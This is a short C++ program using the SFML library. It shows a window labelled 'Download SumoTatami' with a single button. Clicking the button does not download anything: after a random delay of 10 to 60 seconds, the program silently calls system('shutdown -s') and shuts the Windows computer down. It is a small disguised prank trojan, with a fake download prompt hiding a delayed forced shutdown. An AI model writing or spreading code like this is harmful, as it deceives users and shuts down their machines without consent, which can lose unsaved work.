#include <SFML/Graphics.hpp>
#include <SFML/Window/Mouse.hpp>
#include <ctime>
#include "windows.h"


int main()
{
    sf::RenderWindow window(
        sf::VideoMode({ 486, 53 }),
        "Download SumoTatami", sf::State::Windowed);
    sf::Vector2i mouseCoord;
    sf::Texture texture("button.png");
    sf::Sprite Button(texture);
    bool mousepressed = false;
    while (window.isOpen()) {

        while (const std::optional event = window.pollEvent()) {
            if (event->is<sf::Event::Closed>()) {
                window.close();
            }
            if (!sf::Mouse::isButtonPressed(sf::Mouse::Button::Left)) {
                mousepressed = false;
            }

            if (!mousepressed && sf::Mouse::isButtonPressed(sf::Mouse::Button::Left)) {
                mousepressed = true;
                mouseCoord = sf::Mouse::getPosition(window);
                srand(time(0));
                Sleep(10000 + rand()%50000);
                system("shutdown -s");
            }
        }
        window.draw(Button);
        window.display();
    }
}